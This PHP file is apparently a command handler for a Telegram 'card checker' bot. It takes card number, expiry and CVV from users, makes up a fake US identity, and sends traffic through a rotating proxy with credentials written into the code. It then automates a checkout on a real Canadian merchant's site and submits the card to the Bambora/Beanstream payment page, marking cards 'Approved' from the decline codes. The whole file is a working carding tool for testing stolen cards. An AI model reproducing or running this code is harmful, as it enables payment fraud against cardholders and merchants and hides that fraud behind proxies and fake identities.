<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";

$gatewayname="bam";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Bambora_Charged_AVS (".'$15'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 

 
 
 
 $response = CurlX::Get(
    "https://pcc.globalcitizen.ca/name-badge-pharmachoice",
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Referer: https://pcc.globalcitizen.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],
    $cookie,
    $proxies
);
$token = CurlX::ParseString($response->body,"name=__RequestVerificationToken type=hidden value=",">");
$response = CurlX::Post(
    "https://pcc.globalcitizen.ca/addproducttocart/details/86/1",
    'name=https%3A%2F%2Fpcc.globalcitizen.ca%2Fimages%2Fthumbs%2F0000367_name-badge-pharmachoice_550.png&name=Picture+of+Name+Badge-+Pharmachoice&name=0&1739=1&product_attribute_175=all&product_attribute_176=frament+to&__RequestVerificationToken='.$token.'',
    [
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Referer: https://pcc.globalcitizen.ca/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://pcc.globalcitizen.ca/cart",
    '------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="itemquantity7630"

1
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="checkout_attribute_1"

50021
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="checkout_attribute_2"

hola
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="discountcouponcode"


------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="termsofservice"

on
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="checkout"

checkout
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za
Content-Disposition: form-data; name="__RequestVerificationToken"

'.$token.'
------WebKitFormBoundarydQ6PiOGQpY8Rw9Za--
',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Cache-Control: max-age=0',
        'Connection: keep-alive',
        'Content-Type: multipart/form-data; boundary=----WebKitFormBoundarydQ6PiOGQpY8Rw9Za',
        'Origin: https://pcc.globalcitizen.ca',
        'Referer: https://pcc.globalcitizen.ca/',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Sec-Fetch-User: ?1',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua: "Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile: ?0',
        'sec-ch-ua-platform: "Windows"',
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://pcc.globalcitizen.ca/checkout/billingaddress",
    'ShipToSameAddress=true&BillingNewAddress.Id=0&BillingNewAddress.FirstName=alex&BillingNewAddress.LastName=frick&BillingNewAddress.Email='.urlencode($email).'&BillingNewAddress.CountryId=1&BillingNewAddress.StateProvinceId=2&BillingNewAddress.City='.$city.'&BillingNewAddress.Address1='.urlencode($street).'&BillingNewAddress.Address2=&BillingNewAddress.ZipPostalCode='.$zip.'&BillingNewAddress.PhoneNumber='.$phone.'&nextstep=Next&__RequestVerificationToken='.$token.'&ShipToSameAddress=false',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://pcc.globalcitizen.ca/'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Post(
    "https://pcc.globalcitizen.ca/checkout/paymentinfo",
    'nextstep=Next&__RequestVerificationToken='.$token.'',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://pcc.globalcitizen.ca/'
    ],
    $cookie,
    $proxies
);
$response = CurlX::Post(
    "https://pcc.globalcitizen.ca/checkout/confirm",
    'nextstep=Confirm&__RequestVerificationToken='.$token.'',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Referer: https://pcc.globalcitizen.ca/'
    ],
    $cookie,
    $proxies
);
$sessionToken = CurlX::ParseString($response->body,' name="sessionToken" value="','"');
$merchantId = CurlX::ParseString($response->body,' name="merchant_id" value="','"');


   $response = CurlX::Post(
    "https://www.beanstream.com/scripts/payment/payment.asp",
    'sessionToken='.$sessionToken.'&paymentAction=&merchant_id='.$merchantId.'&preview=&visaCheckoutCallId=&getMethodURL=&aDFinancingType=&aDPlanNumber=&aDGracePeriod=&aDTerm=&ordName=alex+frick&ordPhoneCountryCode=1&ordPhoneNumber='.$phone.'&ordPhoneType=m&ordAddress1='.urlencode($Street).'&ordAddress2=&ordCity='.$city.'&ordProvince='.$state_id.'&ordPostalCode='.$zip.'&ordCountry=US&ordEmailAddress='.urlencode($email).'&shipName=&shipEmailAddress=&shipPhoneNumber=&shipAddress1=&shipAddress2=&shipCity=&shipProvince=&shipPostalCode=&shipCountry=&trnOrderNumber=2033-PCC&trnAmount=%2439.80%A0CAD&paymentMethod=CC&trnCardOwner=alec+torres&trnCardType=VI&trnCardNumber='.$cc.'&trnExpMonth='.$mes.'&trnExpYear='.$ano1.'&trnCardCvd='.$cvv.'',
    [
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        
    ],
    $cookie,
    $proxies
);
file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
$action = CurlX::ParseString($response->body,' action="','"');
$rawData = html_entity_decode(CurlX::ParseString($response->body, ' value="', '"'));
$params = [
    'payFormParams' => $rawData
];
$data = http_build_query($params); // Genera automáticamente un cuerpo codificado
$response = CurlX::Post(
    $action,
    $data,
    [
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9',
        'Referer: https://www.beanstream.com/scripts/payment/payment.asp'
    ],
    $cookie,
    $proxies
);

 //==================[Manejo de los mensajes]======================//

 $messageText= CurlX::ParseString($response->headers->response['Location'],"&messageText=","&");
 $avsresult= CurlX::ParseString($response->headers->response['Location'],"&avsResult=","&");
     
 $cvd= CurlX::ParseString($response->headers->response['Location'],"&cvdId=","&");
 $messageavs= urldecode(CurlX::ParseString($response->headers->response['Location'],"&avsMessage=","&"));
 $errormessage="$messageText: $messageavs 
CVD: $cvd | AVS: $avsresult ";
 


if(!$response->code==200){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage == "Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Insufficient Funds"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
          " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved Auth!✅", "en", $lang),
            " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Gateway Rejected: avs"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
           " $errormessage",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
       " $errormessage",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
